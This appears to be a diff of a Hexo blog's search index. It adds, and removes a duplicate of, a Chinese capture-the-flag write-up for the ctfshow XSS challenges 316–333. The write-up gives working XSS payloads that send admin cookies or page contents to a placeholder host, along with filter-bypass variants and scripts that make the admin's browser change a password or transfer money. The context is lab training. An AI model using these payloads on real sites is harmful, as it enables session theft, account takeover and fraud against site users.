@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>ctfshow-xss</title>
+      <link href="/2022/02/19/ctfshow-xss/"/>
+      <url>/2022/02/19/ctfshow-xss/</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><p>在自己的vps上搞</p><p>集成环境 安装小皮面板或者宝塔面板</p><h2 id="316"><a href="#316" class="headerlink" title="316"></a>316<img src="/2022/02/19/ctfshow-xss/image-20211120200251538.png" alt="image-20211120200251538"></h2><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href='http://xxx/1.php?1='+document.cookie;&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="317"><a href="#317" class="headerlink" title="317"></a>317</h2><pre class="line-numbers language-none"><code class="language-none">&lt;body onload="window.location.href='http://xxx/1.php?1='+document.cookie" &gt; &lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="318"><a href="#318" class="headerlink" title="318"></a>318</h2><pre class="line-numbers language-none"><code class="language-none">&lt;body onload="window.location.href='http://xxx/1.php?1='+document.cookie"&gt; &lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="319"><a href="#319" class="headerlink" title="319"></a>319</h2><p>317-319  分别过滤了 script img 等  上面payload通杀</p><h2 id="320"><a href="#320" class="headerlink" title="320"></a>320</h2><p>过滤了空格</p><pre class="line-numbers language-none"><code class="language-none">&lt;body/**/onload="window.location.href='http://xxx/1.php?1='+document.cookie"&gt;&lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="321"><a href="#321" class="headerlink" title="321"></a>321</h2><p>用‘/’ 或者‘/**/’代替空格</p><h2 id="322"><a href="#322" class="headerlink" title="322"></a>322</h2><p>继续通杀</p><h2 id="323-326"><a href="#323-326" class="headerlink" title="323-326"></a>323-326</h2><p>通杀！！！</p><h2 id="327"><a href="#327" class="headerlink" title="327"></a>327</h2><p>我们要拿到管理员的cookie 收件人要是admin </p><pre class="line-numbers language-none"><code class="language-none">&lt;body/**/onload="window.location.href='http://xxx/1.php?1='+document.cookie"&gt;&lt;/body&gt; 不行 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返璞归真</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href='http://xss/1.php?1='+document.cookie;&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="328"><a href="#328" class="headerlink" title="328"></a>328</h2><p>要管理员才能查看用户账号密码，我们可以在注册的时候写入xss 等管理员访问的时候拿到管理员cookie</p><p>抓包伪造管理员的cookie</p><p><img src="/2022/02/19/ctfshow-xss/image-20211120214800843.png" alt="image-20211120214800843"></p><h2 id="329"><a href="#329" class="headerlink" title="329"></a>329</h2><p>cookie发送给攻击者之前就失效了，盗用cookie不行，那就直接获取管理员页面的东东</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.open('http://xxx/1.php?1='+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="330"><a href="#330" class="headerlink" title="330"></a>330</h2><p>发现多了一个修改密码页面，抓包 发现有api接口</p><p>让管理员本机127.0.0.1修改密码</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href='http://127.0.0.1/api/change.php?p=1234'&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后管理员登录得到flag</p><h2 id="331"><a href="#331" class="headerlink" title="331"></a>331</h2><p>post方式修改密码 发现.ajax</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;$.ajax({url:'api/change.php',type:'post',data:{p:'123'}});&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="332"><a href="#332" class="headerlink" title="332"></a>332</h2><p>让收款人转账为负数，自己就无数的钱了</p><h2 id="333"><a href="#333" class="headerlink" title="333"></a>333</h2><p>非预期解：自己给自己转账 加倍增长，预测15此转即可</p><p>预期解:</p><p>先给自己转1元 抓包看参数。</p><p>然后让管理员转钱</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;$.ajax({url:'api/amount.php',type:'post',data:{u:'123',a:'16116'}});&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfshow </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> xss </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ctfshow-网络迷踪</title>
       <link href="/2022/02/11/ctfshow-wang-luo-mi-zong/"/>
       <url>/2022/02/11/ctfshow-wang-luo-mi-zong/</url>
@@ -348,19 +373,6 @@
             <tag> xxe </tag>
             
         </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title></title>
-      <link href="/2022/01/22/ctfshow-xss/"/>
-      <url>/2022/01/22/ctfshow-xss/</url>
-      
-        <content type="html"><![CDATA[<p>title: xss<br>date: 2022-01-22 19:04:39<br>author: 吹<br>img: false<br>top: false<br>hide: false<br>cover: false<br>coverImg: false<br>toc: true<br>mathjax: false<br>summary: ctfshow的xss的wp<br>categories: ctfshow<br>tags:</p><ul><li>xss</li></ul><p>[TOC]</p><p>在自己的vps上搞</p><p>集成环境 安装小皮面板或者宝塔面板</p><h2 id="316"><a href="#316" class="headerlink" title="316"></a>316<img src="/2022/01/22/ctfshow-xss/image-20211120200251538.png" alt="image-20211120200251538"></h2><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href='http://xxx/1.php?1='+document.cookie;&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="317"><a href="#317" class="headerlink" title="317"></a>317</h2><pre class="line-numbers language-none"><code class="language-none">&lt;body onload="window.location.href='http://xxx/1.php?1='+document.cookie" &gt; &lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="318"><a href="#318" class="headerlink" title="318"></a>318</h2><pre class="line-numbers language-none"><code class="language-none">&lt;body onload="window.location.href='http://xxx/1.php?1='+document.cookie"&gt; &lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="319"><a href="#319" class="headerlink" title="319"></a>319</h2><p>317-319  分别过滤了 script img 等  上面payload通杀</p><h2 id="320"><a href="#320" class="headerlink" title="320"></a>320</h2><p>过滤了空格</p><pre class="line-numbers language-none"><code class="language-none">&lt;body/**/onload="window.location.href='http://xxx/1.php?1='+document.cookie"&gt;&lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="321"><a href="#321" class="headerlink" title="321"></a>321</h2><p>用‘/’ 或者‘/**/’代替空格</p><h2 id="322"><a href="#322" class="headerlink" title="322"></a>322</h2><p>继续通杀</p><h2 id="323-326"><a href="#323-326" class="headerlink" title="323-326"></a>323-326</h2><p>通杀！！！</p><h2 id="327"><a href="#327" class="headerlink" title="327"></a>327</h2><p>我们要拿到管理员的cookie 收件人要是admin </p><pre class="line-numbers language-none"><code class="language-none">&lt;body/**/onload="window.location.href='http://xxx/1.php?1='+document.cookie"&gt;&lt;/body&gt; 不行 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返璞归真</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href='http://xss/1.php?1='+document.cookie;&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="328"><a href="#328" class="headerlink" title="328"></a>328</h2><p>要管理员才能查看用户账号密码，我们可以在注册的时候写入xss 等管理员访问的时候拿到管理员cookie</p><p>抓包伪造管理员的cookie</p><p><img src="/2022/01/22/ctfshow-xss/image-20211120214800843.png" alt="image-20211120214800843"></p><h2 id="329"><a href="#329" class="headerlink" title="329"></a>329</h2><p>cookie发送给攻击者之前就失效了，盗用cookie不行，那就直接获取管理员页面的东东</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.open('http://xxx/1.php?1='+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="330"><a href="#330" class="headerlink" title="330"></a>330</h2><p>发现多了一个修改密码页面，抓包 发现有api接口</p><p>让管理员本机127.0.0.1修改密码</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href='http://127.0.0.1/api/change.php?p=1234'&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后管理员登录得到flag</p><h2 id="331"><a href="#331" class="headerlink" title="331"></a>331</h2><p>post方式修改密码 发现.ajax</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;$.ajax({url:'api/change.php',type:'post',data:{p:'123'}});&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="332"><a href="#332" class="headerlink" title="332"></a>332</h2><p>让收款人转账为负数，自己就无数的钱了</p><h2 id="333"><a href="#333" class="headerlink" title="333"></a>333</h2><p>非预期解：自己给自己转账 加倍增长，预测15此转即可</p><p>预期解:</p><p>先给自己转1元 抓包看参数。</p><p>然后让管理员转钱</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;$.ajax({url:'api/amount.php',type:'post',data:{u:'123',a:'16116'}});&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
-      
-      
       
     </entry>
     
